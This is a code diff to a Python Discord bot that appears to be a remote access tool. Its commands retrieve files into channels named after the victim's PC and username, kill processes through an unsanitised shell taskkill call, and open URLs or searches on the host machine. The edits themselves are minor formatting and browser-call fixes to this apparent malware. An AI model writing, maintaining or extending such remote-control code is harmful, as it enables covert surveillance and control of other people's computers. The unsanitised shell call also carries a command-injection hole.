@@ -68,7 +68,7 @@ async def fileretrieval(ctx):
     try:
         pc_name = socket.gethostname()
         username = os.getlogin()
-        channel_name = f"{pc_name}-{username}-files"
+        channel_name = f"{username}-{pc_name}files"
         guild = ctx.guild
         category = ctx.channel.category
 
@@ -194,9 +194,8 @@ async def kp(ctx, *, process: str):
         pids = [proc[1] for proc in processes if len(proc) > 1]
         subprocess.run(f"taskkill /f /im {process} /t", capture_output=True, text=True, shell=True, timeout=7)
         
-        embed = discord.Embed(title=f"Killed Process: {process}", color=discord.Color.red())
-        for pid in pids:
-            embed.add_field(name="PID", value=pid, inline=False)
+        embed = discord.Embed(title=f"Killed Processes: {process}", color=discord.Color.red())
+        embed.add_field(name=f"{process}", value=", ".join(pids), inline=False)
 
         await ctx.send(embed=embed)
 
@@ -248,11 +247,11 @@ async def endpc(ctx):
         await ctx.send(embed=embed)
 async def search(ctx, *, query):
     url = f"https://www.bing.com/search?q={'+'.join(query.split())}"
-    open(url)
+    webbrowser.open(url)
     embed = discord.Embed(title="Search", description=f"Searching for: `{query}`", color=discord.Color.blue())
     embed.add_field(name="URL", value=url, inline=False)
     await ctx.send(embed=embed)
 async def openurl(ctx, url):
-    open(url)
+    webbrowser.open(url)
     embed = discord.Embed(title="Opening URL", description=f"[{url}]({url})", color=discord.Color.green())
     await ctx.send(embed=embed)        
